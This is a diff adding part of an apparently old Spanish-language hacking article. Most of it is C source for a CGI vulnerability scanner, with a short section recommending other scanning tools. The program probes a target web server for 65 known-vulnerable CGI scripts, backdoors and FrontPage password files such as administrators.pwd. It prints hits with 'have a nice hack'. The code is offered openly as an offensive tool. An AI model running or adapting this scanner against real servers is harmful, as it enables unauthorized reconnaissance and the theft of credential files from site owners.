+ buff[15] = "GET /cgi-bin/pfdispaly.cgi HTTP/1.0\n\n";
+ buff[16] = "GET /cgi-bin/perl.exe HTTP/1.0\n\n";
+ buff[17] = "GET /cgi-bin/wwwboard.pl HTTP/1.0\n\n";
+ buff[18] = "GET /cgi-bin/www-sql HTTP/1.0\n\n";
+ buff[19] = "GET /cgi-bin/view-source HTTP/1.0\n\n";
+ buff[20] = "GET /cgi-bin/campas HTTP/1.0\n\n";
+ buff[21] = "GET /cgi-bin/aglimpse HTTP/1.0\n\n";
+ buff[22] = "GET /cgi-bin/glimpse HTTP/1.0\n\n";
+ buff[23] = "GET /cgi-bin/man.sh HTTP/1.0\n\n";
+ buff[24] = "GET /cgi-bin/AT-admin.cgi HTTP/1.0\n\n";
+ buff[25] = "GET /cgi-bin/filemail.pl HTTP/1.0\n\n";
+ buff[26] = "GET /cgi-bin/maillist.pl HTTP/1.0\n\n";
+ buff[27] = "GET /cgi-bin/jj HTTP/1.0\n\n";
+ buff[28] = "GET /cgi-bin/info2www HTTP/1.0\n\n";
+ buff[29] = "GET /cgi-bin/files.pl HTTP/1.0\n\n"; 
+ buff[30] = "GET /cgi-bin/finger HTTP/1.0\n\n";
+ buff[31] = "GET /cgi-bin/bnbform.cgi HTTP/1.0\n\n";
+ buff[32] = "GET /cgi-bin/survey.cgi HTTP/1.0\n\n";
+ buff[33] = "GET /cgi-bin/AnyForm2 HTTP/1.0\n\n";
+ buff[34] = "GET /cgi-bin/textcounter.pl HTTP/1.0\n\n";
+ buff[35] = "GET /cgi-bin/classifieds.cgi HTTP/1.0\n\n";
+ buff[36] = "GET /cgi-bin/environ.cgi HTTP/1.0\n\n";
+ buff[37] = "GET /cgi-bin/wrap HTTP/1.0\n\n";
+ buff[38] = "GET /cgi-bin/cgiwrap HTTP/1.0\n\n";
+ buff[39] = "GET /cgi-bin/guestbook.cgi HTTP/1.0\n\n";
+ buff[40] = "GET /cgi-bin/edit.pl HTTP/1.0\n\n";
+ buff[41] = "GET /cgi-bin/perlshop.cgi HTTP/1.0\n\n";
+ buff[42] = "GET /_vti_inf.html HTTP/1.0\n\n";
+ buff[43] = "GET /_vti_pvt/service.pwd HTTP/1.0\n\n";
+ buff[44] = "GET /_vti_pvt/users.pwd HTTP/1.0\n\n";
+ buff[45] = "GET /_vti_pvt/authors.pwd HTTP/1.0\n\n";
+ buff[46] = "GET /_vti_pvt/administrators.pwd HTTP/1.0\n\n";
+ buff[47] = "GET /_vti_bin/shtml.dll HTTP/1.0\n\n";
+ buff[48] = "GET /_vti_bin/shtml.exe HTTP/1.0\n\n";
+ buff[49] = "GET /cgi-dos/args.bat HTTP/1.0\n\n";
+ buff[50] = "GET /cgi-win/uploader.exe HTTP/1.0\n\n";
+ buff[51] = "GET /cgi-bin/rguest.exe HTTP/1.0\n\n";
+ buff[52] = "GET /cgi-bin/wguest.exe HTTP/1.0\n\n";
+ buff[53] = "GET /scripts/issadmin/bdir.htr HTTP/1.0\n\n";
+ buff[54] = "GET /scripts/CGImail.exe HTTP/1.0\n\n";
+ buff[55] = "GET /scripts/tools/newdsn.exe HTTP/1.0\n\n";
+ buff[56] = "GET /scripts/fpcount.exe HTTP/1.0\n\n";
+ buff[57] = "GET /cfdocs/expelval/openfile.cfm HTTP/1.0\n\n";
+ buff[58] = "GET /cfdocs/expelval/exprcalc.cfm HTTP/1.0\n\n";
+ buff[59] = "GET /cfdocs/expelval/displayopenedfile.cfm HTTP/1.0\n\n";
+ buff[60] = "GET /cfdocs/expelval/sendmail.cfm HTTP/1.0\n\n";
+ buff[61] = "GET /iissamples/exair/howitworks/codebrws.asp HTTP/1.0\n\n"; 
+ buff[62] = "GET /iissamples/sdk/asp/docs/codebrws.asp HTTP/1.0\n\n";
+ buff[63] = "GET /msads/Samples/SELECTOR/showcode.asp HTTP/1.0\n\n";
+ buff[64] = "GET /search97.vts HTTP/1.0\n\n";
+ buff[65] = "GET /carbo.dll HTTP/1.0\n\n"; /* we have at archive about 70 CGi ,
+                                                                   rule? ;-) */
+
+ cginame[1] = "UnlG - backd00r ";
+ cginame[2] = "THC - backd00r  ";
+ cginame[3] = "phf..classic :) ";
+ cginame[4] = "Count.cgi       ";
+ cginame[5] = "test-cgi        ";
+ cginame[6] = "nph-test-cgi    ";
+ cginame[7] = "nph-publish     ";
+ cginame[8] = "php.cgi         ";
+ cginame[9] = "handler         ";
+ cginame[10] = "webgais         ";
+ cginame[11] = "websendmail     ";
+ cginame[12] = "webdist.cgi     ";
+ cginame[13] = "faxsurvey       ";
+ cginame[14] = "htmlscript      ";
+ cginame[15] = "pfdisplay       ";
+ cginame[16] = "perl.exe        ";
+ cginame[17] = "wwwboard.pl     ";
+ cginame[18] = "www-sql         ";
+ cginame[19] = "view-source     ";
+ cginame[20] = "campas          ";
+ cginame[21] = "aglimpse        ";
+ cginame[22] = "glimpse         ";
+ cginame[23] = "man.sh          ";
+ cginame[24] = "AT-admin.cgi    ";
+ cginame[25] = "filemail.pl     ";
+ cginame[26] = "maillist.pl     ";
+ cginame[27] = "jj              ";
+ cginame[28] = "info2www        ";
+ cginame[29] = "files.pl        ";
+ cginame[30] = "finger          ";
+ cginame[31] = "bnbform.cgi     ";
+ cginame[32] = "survey.cgi      ";
+ cginame[33] = "AnyForm2        ";
+ cginame[34] = "textcounter.pl  ";
+ cginame[35] = "classifields.cgi";
+ cginame[36] = "environ.cgi     ";
+ cginame[37] = "wrap            ";
+ cginame[38] = "cgiwrap         ";
+ cginame[39] = "guestbook.cgi   ";
+ cginame[40] = "edit.pl         ";
+ cginame[41] = "perlshop.cgi    ";
+ cginame[42] = "_vti_inf.html   ";
+ cginame[43] = "service.pwd     ";
+ cginame[44] = "users.pwd       ";
+ cginame[45] = "authors.pwd     ";
+ cginame[46] = "administrators  ";
+ cginame[47] = "shtml.dll       ";
+ cginame[48] = "shtml.exe       ";
+ cginame[49] = "args.bat        ";
+ cginame[50] = "uploader.exe    ";
+ cginame[51] = "rguest.exe      ";
+ cginame[52] = "wguest.exe      ";
+ cginame[53] = "bdir - samples  ";
+ cginame[54] = "CGImail.exe     ";
+ cginame[55] = "newdsn.exe      ";
+ cginame[56] = "fpcount.exe     ";
+ cginame[57] = "openfile.cfm    ";
+ cginame[58] = "exprcalc.cfm    ";
+ cginame[59] = "dispopenedfile  ";
+ cginame[60] = "sendmail.cfm    ";
+ cginame[61] = "codebrws.asp    ";
+ cginame[62] = "codebrws.asp 2  ";
+ cginame[63] = "showcode.asp    ";
+ cginame[64] = "search97.vts    ";
+ cginame[65] = "carbo.dll       ";
+
+ if (argc<2)
+   {
+   printf("\n [-- CGI Checker 1.35. Modified by su1d sh3ll //UnlG --]");
+   printf("\nusage : %s host ",argv[0]);
+   printf("\n   Or : %s host -d   for debug mode\n\n",argv[0]); 
+   exit(0);
+   }
+
+ if (argc>2)
+   {
+   if(strstr("-d",argv[2]))
+     {
+     debugm=1;
+     }
+   }
+
+ if ((he=gethostbyname(argv[1])) == NULL)
+   {
+   herror("gethostbyname");
+   exit(0);
+   }
+
+ printf("\n\n\t [CKS & Fdisk]'s CGI Checker - modify by su1d sh3ll //UnlG\n\n\n");
+ start=inet_addr(argv[1]);
+ counter=ntohl(start);
+
+   sock=socket(AF_INET, SOCK_STREAM, 0);
+   bcopy(he->h_addr, (char *)&sin.sin_addr, he->h_length);
+   sin.sin_family=AF_INET;
+   sin.sin_port=htons(80);    /* <--- if u want scan another port change it  */
+                              /* codex when u again change this code pls call 
+                                 proggi like this 1.35.1 or 1.35.[a..z] ;-)  */
+
+  if (connect(sock, (struct sockaddr*)&sin, sizeof(sin))!=0)
+     {
+     perror("connect");
+     }
+   printf("\n\n\t [ Press any key to check out the httpd version...... ]\n");
+   getchar();     /* CKS  sorry, but ur new piece of code don't work :-( */
+   send(sock, "HEAD / HTTP/1.0\n\n",17,0);
+   recv(sock, buffer, sizeof(buffer),0);
+   printf("%s",buffer);
+   close(sock); 
+  
+   printf("\n\t [ Press any key to search 4 CGI stuff...... ]\n");
+   getchar();
+   
+while(count++ < 65)    /* huh! 65 cgi..... no secur1ty in th1s w0rld ;-)*/
+   {
+   sock=socket(AF_INET, SOCK_STREAM, 0);
+   bcopy(he->h_addr, (char *)&sin.sin_addr, he->h_length);
+   sin.sin_family=AF_INET;
+   sin.sin_port=htons(80);
+   if (connect(sock, (struct sockaddr*)&sin, sizeof(sin))!=0)
+     {
+     perror("connect");
+     }
+   printf("Searching for %s : ",cginame[count]);
+  
+   for(numin=0;numin < 1024;numin++)
+      {
+      cgibuff[numin] = '\0';
+      } 
+  
+   send(sock, buff[count],strlen(buff[count]),0);
+   recv(sock, cgibuff, sizeof(cgibuff),0);
+   cgistr = strstr(cgibuff,foundmsg);
+   if( cgistr != NULL)   {
+       printf("Found !! ;)\n");++suxes;     }
+   else
+       printf("Not Found\n");
+      
+  if(debugm==1)
+    { 
+    printf("\n\n ------------------------\n %s \n ------------------------\n",cgibuff); 
+    printf("Press any key to continue....\n");         getchar();
+    }  
+   close(sock);
+   }
+   if (suxes){   printf("...have a nice hack... ;-)\n");}
+   else {printf ("...n0thing wr0ng on server..... hmm...sucks!\n");} 
+ }
+--------------------------------corta aqui-----------------------------------
+
+Y para los usuarios de win NT, bueno, estos cuentan con una poderosa
+herramienta llamada Retina  que tambien escanea la posible existencia de
+cgi's vulnerables en un site y para los usuarios de win9x, tambien hay algo,
+un programa llamado webscan creado por David Litchfield que salio a la luz
+hace poco y que nos podra ayudar en este aspecto.
+
+
+LINKS
+~~~~~
+
+ -ALGUNOS SITES DONDE ENCONTRARAS VULNERABILIDADES DE CGI's ENTRE OTRAS
+
+          <Ripe: ­Censurado! :->, quiza que busqueis vosotros
+                 mismos>
+
+ -SITES CON HERRAMIENTAS DE ESCANEO DE CGI's
+
+Retina---->http://www.eEye.com
+Webscan--->http://www.cerberus-infosec.co.uk
+
+NOTA: tambien podras encontrar escaners en las paginas de vulnerabilidades
